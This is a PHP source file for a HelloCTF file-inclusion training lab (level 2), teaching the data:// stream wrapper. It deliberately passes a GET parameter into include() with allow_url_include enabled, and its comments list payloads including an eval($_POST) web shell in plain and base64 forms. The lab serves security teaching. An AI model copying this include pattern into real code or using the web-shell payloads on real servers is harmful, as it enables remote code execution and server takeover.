<?php 
include("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-07-28 20:30
# @Repo:   github.com/ProbiusOfficial/PHPinclude-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - 文件包含基础靶场 关卡 2 : data协议_1 --- 

本关卡你将只能使用 data 协议 — (» RFC 2397) 数据流封装器(https://www.php.net/manual/zh/wrappers.data.php),更像是给了你另外一次输入机会(x

如果传入的数据是PHP代码，就会执行代码：
data://text/plain,<?php phpinfo();?>
data://text/plain,<?php eval($_POST['helloctf']);?>

data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2hlbGxvY3RmJ10pOz8+

or data:text/plain

依赖：
allow_url_fopen:On;
allow_url_include:On;
PHP_Version>=5.2.0


该关卡配置:
allow_url_fopen:On
allow_url_include:On

相关文件：
- 当前目录下 flag.php 文件，flag以静态变量形式存储在文件中。
- 根目录下 flag 文件，flag以文本形式存储在文件中。

 
*/

/* Try ?wrappers=,<?php phpinfo();?> */

echo include("data://text/plain;base64,4pedKCrigbDilr/igbAqKeKXnEhlbGxvLUNURnd3");

isset($_GET['wrappers']) ? include("data://text/plain".$_GET['wrappers']) : '';

highlight_file(__FILE__);

?>